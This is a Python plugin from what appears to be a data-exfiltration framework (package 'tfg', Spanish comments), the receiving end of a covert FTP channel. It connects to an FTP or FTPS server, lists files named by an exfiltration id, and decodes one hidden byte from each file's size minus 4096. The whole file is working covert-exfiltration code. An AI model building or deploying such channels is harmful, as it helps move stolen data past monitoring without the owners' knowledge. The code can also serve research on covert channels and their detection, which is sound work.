from __future__ import annotations
from typing import Dict, Any, Iterable
from ftplib import FTP, FTP_TLS, error_perm
import re

from tfg.plugins.api import ExfilServerPlugin

BASE = 4096


def _connect_ftp(config: Dict[str, Any]) -> FTP:
    host = config["host"]
    port = int(config.get("port", 21))
    user = config.get("user") or "anonymous"
    password = config.get("password") or "anonymous@"

    ftp = FTP()
    ftp.connect(host, port, timeout=30)
    try:
        ftp.login(user=user, passwd=password)
        return ftp
    except error_perm as e:
        msg = str(e).lower()
        ftp.close()
        if "auth" not in msg:
            raise

    ftps = FTP_TLS()
    ftps.connect(host, port, timeout=30)
    ftps.auth()
    ftps.login(user=user, passwd=password)
    ftps.prot_p()
    return ftps


class FtpServerSize(ExfilServerPlugin):
    canal = "FTP"
    metodo = 3
    name = "ftp_server_size"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        root = config.get("root") or "/"
        exfil_id = config.get("exfil_id") or "tfg"

        pat = re.compile(rf"^{re.escape(exfil_id)}\.sz\.(\d{{6}})$")
        ftp = _connect_ftp(config)
        if root and root != "/":
            ftp.cwd(root)
        names = []
        ftp.retrlines("NLST", names.append)
        parts = sorted(n for n in names if pat.match(n))

        def gen():
            out = bytearray()
            for n in parts:
                # Tamaño remoto (SIZE puede no estar permitido; si falla, RETR y len(...))
                size = None
                try:
                    size = ftp.size(n)
                except Exception:
                    from io import BytesIO

                    bio = BytesIO()
                    ftp.retrbinary(f"RETR {n}", bio.write)
                    size = len(bio.getvalue())
                b = (size - BASE) & 0xFF
                out.append(b)
            ftp.quit()
            if out:
                yield bytes(out)

        return gen()
